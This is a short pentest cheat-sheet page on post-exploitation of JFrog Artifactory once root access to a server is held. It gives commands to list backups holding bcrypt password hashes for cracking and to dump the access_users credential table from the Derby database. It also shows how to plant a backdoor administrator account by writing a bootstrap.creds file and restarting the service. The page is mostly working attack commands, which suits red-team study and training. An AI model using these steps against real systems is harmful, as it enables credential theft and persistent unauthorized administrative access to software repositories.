# Artifactory

### Get Credentials

In this scenario we have root access to the server but no login credentials for Artifactory.

#### Check backups

```text
ls -lah /<artifcatory folder>/var/backup/access
```

This might contain the passwords in bcrypt format which might be crackable.

#### Enumerating the database

CLI:

```text
/opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-<version>-bin/lib/derbyrun.jar ij
connect 'jdbc:derby:<path to db>';
select * from access_users;
```

### Create another Admin Account

```text
echo "xct@*=xct" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
/opt/jfrog/artifactory/app/bin/artifactoryctl stop
/opt/jfrog/artifactory/app/bin/artifactoryctl start
tail /opt/jfrog/artifactory/var/log/console.log
```

